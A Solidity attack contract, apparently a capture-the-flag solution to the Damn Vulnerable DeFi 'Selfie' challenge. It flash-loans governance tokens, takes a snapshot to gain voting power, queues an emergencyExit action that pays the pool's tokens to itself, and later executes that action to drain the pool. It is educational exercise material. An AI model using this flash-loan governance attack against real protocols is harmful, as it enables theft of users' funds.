// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "hardhat/console.sol";

interface ISelfiePool {
    function token() external view returns (address);

    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external;
}

contract SelfieAttack {
    ISimpleGovernance public immutable governance;
    ISelfiePool public immutable pool;
    DamnValuableTokenSnapshot public immutable token;
    uint256 public actionId;

    constructor(address _governance, address _pool) {
        governance = ISimpleGovernance(_governance);
        pool = ISelfiePool(_pool);
        token = DamnValuableTokenSnapshot(pool.token());
    }

    function attackToInsertAction() external {
        uint256 amount = token.getBalanceAtLastSnapshot(address(pool));
        console.log("token balance", amount);
        // 1. flash loan governance tokens
        pool.flashLoan(address(this), address(token), amount, "");
    }

    function attackToExecuteAction() external {
        // 3. Execute the action
        governance.executeAction(actionId);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();
        // 2. Queue an action to transfer all governance tokens to the attacker
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", address(this))
        );
        token.approve(address(pool), token.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
